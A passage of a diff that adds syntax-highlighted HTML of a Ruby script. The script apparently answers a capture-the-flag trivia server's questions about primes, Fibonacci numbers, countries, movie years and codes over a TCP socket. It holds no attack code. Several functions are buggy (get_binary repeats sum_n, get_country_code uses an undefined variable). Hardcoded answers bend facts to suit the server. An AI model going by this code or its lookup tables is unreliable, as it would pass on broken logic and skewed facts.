+	   	<span class="n">curr_num</span><span class="p">,</span> <span class="n">next_num</span> <span class="o">=</span> <span class="n">next_num</span><span class="p">,</span> <span class="n">curr_num</span> <span class="o">+</span> <span class="n">next_num</span>
+	<span class="k">end</span>  
+	<span class="nb">p</span> <span class="n">curr_num</span>
+	<span class="n">curr_num</span>
+<span class="k">end</span> 
+
+<span class="k">def</span> <span class="nf">get_country</span><span class="p">(</span><span class="n">city</span><span class="p">)</span>
+	<span class="n">city</span> <span class="o">=</span> <span class="n">city</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Pristina"</span>
+		<span class="k">return</span> <span class="s2">"Kosovo"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Palikir"</span>
+		<span class="k">return</span> <span class="s2">"Federated States of Micronesia"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"San Jose"</span>
+		<span class="k">return</span> <span class="s2">"Costa Rica"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Castries"</span>
+		<span class="k">return</span> <span class="s2">"Saint Lucia"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Nassau"</span>
+		<span class="k">return</span> <span class="s2">"Bahamas"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Nicosia"</span>
+		<span class="k">return</span> <span class="s2">"Cyprus"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Sao Tome"</span>
+		<span class="k">return</span> <span class="s2">"Sao Tome and Principe"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Belfast"</span>
+		<span class="k">return</span> <span class="s2">"Northern Ireland"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Victoria"</span>
+		<span class="k">return</span> <span class="s2">"Hong Kong"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Edinburgh"</span>
+		<span class="k">return</span> <span class="s2">"Scotland"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Skopje"</span>
+		<span class="k">return</span> <span class="s2">"Macedonia"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Kingston"</span>
+		<span class="k">return</span> <span class="s2">"Jamaica"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Georgetown"</span>
+		<span class="k">return</span> <span class="s2">"Guyana"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Cardiff"</span>
+		<span class="k">return</span> <span class="s2">"Wales"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"Dili"</span>
+		<span class="k">return</span> <span class="s2">"Democratic Republic of Timor-Leste"</span>
+	<span class="k">end</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="no">URI</span><span class="o">::</span><span class="n">encode</span><span class="p">(</span><span class="s2">"address="</span><span class="o">+</span><span class="n">city</span><span class="o">+</span><span class="s2">"&amp;sensor=false&amp;language=en"</span><span class="p">)</span>
+	<span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s1">'http://maps.googleapis.com/maps/api/geocode/json?'</span><span class="o">+</span><span class="n">data</span><span class="p">)</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
+
+	<span class="n">a</span> <span class="o">=</span> <span class="no">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">c</span> <span class="k">in</span> <span class="n">a</span><span class="p">[</span><span class="s2">"results"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">"address_components"</span><span class="p">]</span>
+		<span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="s2">"types"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"country"</span>
+			<span class="nb">p</span> <span class="n">c</span><span class="p">[</span><span class="s2">"long_name"</span><span class="p">]</span>
+			<span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="s2">"long_name"</span><span class="p">].</span><span class="nf">to_s</span> <span class="o">==</span> <span class="s2">"Côte d'Ivoire"</span>
+				<span class="c1">#return "Côte"</span>
+				<span class="k">return</span> <span class="s2">"Ivory Coast"</span>
+			<span class="k">end</span>
+			<span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="s2">"long_name"</span><span class="p">].</span><span class="nf">to_s</span> <span class="o">==</span> <span class="s2">"The Gambia"</span>
+				<span class="k">return</span> <span class="s2">"Gambia"</span>
+			<span class="k">end</span>
+			<span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="s2">"long_name"</span><span class="p">].</span><span class="nf">to_s</span> <span class="o">==</span> <span class="s2">"United Kingdom"</span>
+				<span class="k">return</span> <span class="s2">"England"</span>
+			<span class="k">end</span>
+			<span class="k">return</span> <span class="n">c</span><span class="p">[</span><span class="s2">"long_name"</span><span class="p">].</span><span class="nf">to_s</span>
+		<span class="k">end</span>
+	<span class="k">end</span>
+<span class="k">end</span>	
+
+<span class="k">def</span> <span class="nf">get_movie_year</span><span class="p">(</span><span class="n">movie</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"28 Days Later..."</span>
+		<span class="k">return</span> <span class="s2">"2002"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Goliyon Ki Raasleela Ram-Leela"</span>
+		<span class="k">return</span> <span class="s2">"2013"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Heer Ranjha - A True Love Story"</span>
+		<span class="k">return</span> <span class="s2">"2009"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"The Seven-Per-Cent Solution"</span>
+		<span class="k">return</span> <span class="s2">"1976"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Human resources: Social engineering in the 20th century"</span>
+		<span class="k">return</span> <span class="s2">"2010"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Long Da Lishkara"</span>
+		<span class="k">return</span> <span class="s2">"1986"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"300"</span>
+		<span class="k">return</span> <span class="s2">"2006"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Inkheart"</span>
+		<span class="k">return</span> <span class="s2">"2008"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"The Expendables"</span>
+		<span class="k">return</span> <span class="s2">"2010"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Ted"</span>
+		<span class="k">return</span> <span class="s2">"2012"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"The Seventh Horse of the Sun"</span>
+		<span class="k">return</span> <span class="s2">"1993"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Jay-Z and Linkin Park - Collision Course"</span>
+		<span class="k">return</span> <span class="s2">"2004"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Disconnect"</span>
+		<span class="k">return</span> <span class="s2">"2012"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Howl's Moving Castle"</span>
+		<span class="k">return</span> <span class="s2">"2004"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Die Hard"</span>
+		<span class="k">return</span> <span class="s2">"1988"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"You"</span>
+		<span class="k">return</span> <span class="s2">"2009"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">movie</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"Good Boy"</span>
+		<span class="k">return</span> <span class="s2">"2009"</span>
+	<span class="k">end</span>
+	<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://api.rottentomatoes.com/api/public/v1.0/movies.json?apikey=[key]&amp;q="</span><span class="o">+</span><span class="n">movie</span>
+	<span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="no">URI</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">strip</span><span class="p">))</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
+	<span class="n">a</span> <span class="o">=</span> <span class="no">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">a</span><span class="p">[</span><span class="s2">"movies"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">"year"</span><span class="p">].</span><span class="nf">to_s</span>
+<span class="k">end</span>	
+
+<span class="k">def</span> <span class="nf">get_country_code</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Brazil"</span>
+		<span class="k">return</span> <span class="s2">"BR"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"New Caledonia"</span>
+		<span class="k">return</span> <span class="s2">"NC"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Yemen"</span>
+		<span class="k">return</span> <span class="s2">"YD"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Sao Tome and Principe"</span>
+		<span class="k">return</span> <span class="s2">"ST"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Svalbard and Jan Mayen"</span>
+		<span class="k">return</span> <span class="s2">"SJ"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Uzbekistan"</span>
+		<span class="k">return</span> <span class="s2">"UZ"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Guinea-Bissau"</span>
+		<span class="k">return</span> <span class="s2">"GW"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Myanmar"</span>
+		<span class="k">return</span> <span class="s2">"MM"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Dominican Republic"</span>
+		<span class="k">return</span> <span class="s2">"DO"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Estonia"</span>
+		<span class="k">return</span> <span class="s2">"EE"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Costa Rica"</span>
+		<span class="k">return</span> <span class="s2">"CR"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Pakistan"</span>
+		<span class="k">return</span> <span class="s2">"PK"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Lesotho"</span>
+		<span class="k">return</span> <span class="s2">"LS"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Seychelles"</span>
+		<span class="k">return</span> <span class="s2">"SC"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"British Indian Ocean Territory"</span>
+		<span class="k">return</span> <span class="s2">"IO"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"South Sudan"</span>
+		<span class="k">return</span> <span class="s2">"SS"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Somalia"</span>
+		<span class="k">return</span> <span class="s2">"SO"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Hungary"</span>
+		<span class="k">return</span> <span class="s2">"HU"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"United Arab Emirates"</span>
+		<span class="k">return</span> <span class="s2">"AE"</span>
+	<span class="k">end</span>
+	<span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">"Guyana"</span>
+		<span class="k">return</span> <span class="s2">"GY"</span>
+	<span class="k">end</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="no">URI</span><span class="o">::</span><span class="n">encode</span><span class="p">(</span><span class="s2">"address="</span><span class="o">+</span><span class="n">city</span><span class="o">+</span><span class="s2">"&amp;sensor=false&amp;language=en"</span><span class="p">)</span>
+	<span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s1">'http://maps.googleapis.com/maps/api/geocode/json?'</span><span class="o">+</span><span class="n">data</span><span class="p">)</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
+
+	<span class="n">a</span> <span class="o">=</span> <span class="no">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">c</span> <span class="k">in</span> <span class="n">a</span><span class="p">[</span><span class="s2">"results"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">"address_components"</span><span class="p">]</span>
+		<span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="s2">"types"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"country"</span>
+			<span class="nb">p</span> <span class="n">c</span><span class="p">[</span><span class="s2">"short_name"</span><span class="p">]</span>
+			<span class="k">return</span> <span class="n">c</span><span class="p">[</span><span class="s2">"short_name"</span><span class="p">]</span>
+		<span class="k">end</span>
+	<span class="k">end</span>
+
+	<span class="k">for</span> <span class="n">country</span> <span class="k">in</span> <span class="vg">$db</span>
+		<span class="nb">name</span> <span class="o">=</span> <span class="n">country</span><span class="p">[</span><span class="s1">'Name'</span><span class="p">].</span><span class="nf">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
+		<span class="k">if</span> <span class="nb">name</span> <span class="o">==</span> <span class="n">c</span>
+			<span class="k">return</span> <span class="n">country</span><span class="p">[</span><span class="s1">'Code'</span><span class="p">]</span>  
+		<span class="k">end</span>
+	<span class="k">end</span>
+<span class="k">end</span>	
+
+<span class="k">def</span> <span class="nf">get_pi</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+	<span class="n">row</span><span class="p">,</span> <span class="n">col</span> <span class="o">=</span> <span class="n">n</span> <span class="o">/</span> <span class="mi">50</span><span class="p">,</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">50</span>
+	<span class="n">cur_row</span> <span class="o">=</span> <span class="mi">0</span>
+	<span class="no">IO</span><span class="p">.</span><span class="nf">foreach</span><span class="p">(</span><span class="s1">'pi.txt'</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
+		<span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+		<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">0</span><span class="o">...</span><span class="n">line</span><span class="p">.</span><span class="nf">length</span>
+			<span class="k">if</span> <span class="n">cur_row</span> <span class="o">==</span> <span class="n">row</span> <span class="n">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">col</span>
+				<span class="nb">p</span> <span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+				<span class="k">return</span> <span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+			<span class="k">end</span>
+		<span class="k">end</span>
+		<span class="n">cur_row</span> <span class="o">+=</span> <span class="mi">1</span>
+	<span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">sum_n</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">n</span><span class="o">*</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+	<span class="nb">p</span> <span class="n">ret</span>
+	<span class="n">ret</span>
+<span class="k">end</span>	
+
+<span class="k">def</span> <span class="nf">get_binary</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">n</span><span class="o">*</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+	<span class="nb">p</span> <span class="n">ret</span>
+	<span class="n">ret</span>
+<span class="k">end</span>	
+
+<span class="k">def</span> <span class="nf">cal_md5</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+	<span class="n">md5</span> <span class="o">=</span> <span class="no">Digest</span><span class="o">::</span><span class="no">MD5</span><span class="p">.</span><span class="nf">new</span>
+	<span class="n">md5</span><span class="p">.</span><span class="nf">update</span> <span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+	<span class="nb">p</span> <span class="n">md5</span><span class="p">.</span><span class="nf">hexdigest</span>  
+	<span class="n">md5</span><span class="p">.</span><span class="nf">hexdigest</span>  
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">sum_odd</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">n</span><span class="o">**</span><span class="mi">2</span>
+	<span class="nb">p</span> <span class="n">ret</span>
+	<span class="n">ret</span>
+<span class="k">end</span>
+
+<span class="n">code_db</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">gen_codedb</span><span class="p">(</span><span class="n">code_db</span><span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">HOST</span><span class="p">,</span> <span class="no">PORT</span><span class="p">)</span>
+<span class="n">ok</span> <span class="o">=</span> <span class="kp">false</span>
+<span class="k">while</span> <span class="kp">true</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">length</span> <span class="o">==</span> <span class="mi">0</span>
+		<span class="nb">puts</span> <span class="n">res</span>
+		<span class="k">break</span>
+	<span class="k">end</span>
+  <span class="c1"># sleep 10 minute if it got the flag</span>
+	<span class="k">if</span> <span class="n">ok</span> <span class="o">==</span> <span class="kp">true</span> <span class="n">and</span> <span class="n">res</span><span class="p">.</span><span class="nf">include?</span> <span class="s2">"flag"</span>
+		<span class="nb">puts</span> <span class="n">res</span>
+		<span class="nb">sleep</span><span class="p">(</span><span class="mi">600</span><span class="p">)</span>
+	<span class="k">end</span>
+	<span class="n">ok</span> <span class="o">=</span> <span class="kp">true</span>
+	<span class="nb">puts</span> <span class="n">res</span>
+	<span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)rd prime number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)rd prime number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_prime</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)st prime number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)st prime number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_prime</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)th prime number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)th prime number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_prime</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)nd prime number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)nd prime number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_prime</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)nd fibonacci number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)nd fibonacci number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_fib</span><span class="p">(</span><span class="n">n</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)rd fibonacci number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)rd fibonacci number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_fib</span><span class="p">(</span><span class="n">n</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)st fibonacci number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)st fibonacci number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">solve_fib</span><span class="p">(</span><span class="n">n</span><span class="p">).</span><span class="nf">to_i</span>
+		<span class="nb">p</span> <span class="s2">"answer:"</span><span class="o">+</span><span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span>
+		<span class="n">sock</span><span class="p">.</span><span class="nf">write</span> <span class="n">answer</span><span class="p">.</span><span class="nf">to_s</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="k">elsif</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/(\d+)th fibonacci number/</span><span class="p">)</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/the (\d+)th fibonacci number/</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
+		<span class="nb">puts</span> <span class="s2">"n: "</span><span class="o">+</span><span class="n">n</span><span class="p">.</span><span class="nf">to_s</span>
